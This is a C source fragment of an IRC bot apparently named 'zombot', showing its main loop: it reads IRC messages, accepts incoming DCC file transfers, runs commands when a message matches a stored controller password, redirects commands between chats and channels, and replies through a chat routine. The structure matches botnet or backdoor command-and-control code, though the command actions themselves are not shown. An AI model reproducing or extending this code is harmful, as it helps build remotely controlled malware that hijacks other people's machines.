
void irc_zombot()
{
  ini_load();

  for (;;)              // main cycle for irc_recvline()
  {
    irc_recvline();
    if (irc_error) return;

    // process KICKs, and etc.
    aictrl();

    if (!strcmpi(strv[1], "PRIVMSG"))
    {

      // :DCC SEND fname 2130706433 50677 142606
      if (!stricmp(strv[3], ":DCC"))
      if (!stricmp(strv[4], "SEND"))
      if (strc == 9)
      {
        strcpy(dccr.dcc_recv_fname, strv[5]);
        dccr.dcc_recv_ip = htonl(atoi(strv[6]));
        dccr.dcc_recv_port = atoi(strv[7]);
        strv[8][strlen(strv[8])-1] = 0;     //  before end-of-line
        dccr.dcc_recv_size = atoi(strv[8]);
        continue;
      }

      // both personal && channel msgs -- single action

      check_for_psw(strv[3]+1);

      if (!strcmp(strv[3]+1, irc_psw))
      {
        action_single(4);
        continue;
      } // key_psw

      // only personal msgs
      if (!strcmpi(strv[2], irc_user_nick))
      {

        // REDIRect - from personal chat
        sprintf(redir_prefix, "%s>> ", irc_caller);
        if (do_redir(irc_caller, ptrv[3]+1)) continue;

        // personal chat
        aitalk(0,ptrv[3]);
        continue;

      } // personal

      // only chan msgs
      if (strv[2][0]=='#')
      {
        // REDIRect - from chan
        sprintf(redir_prefix, "%s>> %s>> ", strv[2], irc_caller);
        if (do_redir(strv[2], ptrv[3]+1)) continue;

        strcpy(irc_caller, strv[2]);    // target = #chan, instead of nick
        aitalk(1, ptrv[3]);
        continue;
      }

    } // PRIVMSG

    // default: never reply!!! (cycle)

  } // for (;;) { ...   -- main zombot irc_recvline() cycle

} // irc_zombot

void irc_session()
{
  irc_login();
  if (irc_error) return;

  irc_zombot();
  if (irc_error) return;

  irc_send("QUIT :.\n");
} // irc_session
